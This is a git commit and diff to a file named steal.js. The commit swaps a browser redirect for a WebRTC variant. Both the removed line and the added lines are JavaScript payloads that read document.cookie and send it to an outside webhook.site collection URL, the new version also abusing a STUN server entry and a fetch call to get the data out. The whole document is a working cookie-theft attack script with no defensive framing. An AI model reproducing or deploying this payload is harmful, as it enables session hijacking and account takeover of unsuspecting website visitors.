fed82a2870e0ddede98ec5b2cccbbe78ba908fe8
Moonkey182 <monkeybox182@gmail.com>
2026-05-14 23:16:20 +0200

    Update steal.js

--- steal.js
+++ steal.js
@@ -1,1 +1,8 @@
-window.location.href='https://webhook.site/00372afa-623d-4c19-b4f9-20bda57d56d5/?c='+document.cookie;
+var pc = new RTCPeerConnection({iceServers:[{urls:'stun:webhook.site'}]});
+pc.createDataChannel('c:'+document.cookie);
+pc.createOffer().then(o=>pc.setLocalDescription(o));
+pc.onicecandidate = e => {
+  if(e.candidate) {
+    fetch('https://webhook.site/00372afa-623d-4c19-b4f9-20bda57d56d5/?c='+document.cookie);
+  }
+};
